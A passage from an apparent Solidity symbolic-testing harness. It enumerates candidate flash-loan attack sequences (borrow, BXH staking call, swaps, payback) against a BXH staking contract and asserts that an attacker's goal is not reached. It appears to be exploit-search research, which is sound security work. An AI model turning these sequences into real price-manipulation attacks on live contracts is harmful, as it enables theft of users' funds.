        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_usdt_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_bxh_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        borrow_pair_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        borrow_pair_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_pair_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_bxh(amt0);
        borrow_pair_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_pair_bxh(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        payback_owner_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_bxhstaking_bxh(amt2);
        payback_owner_usdt(amt3);
        swap_pair_bxh_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_bxhstaking_bxh(amt1);
        swap_pair_bxh_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_bxh_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_bxh(amt1);
        transaction_bxhstaking_bxh(amt2);
        swap_pair_bxh_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
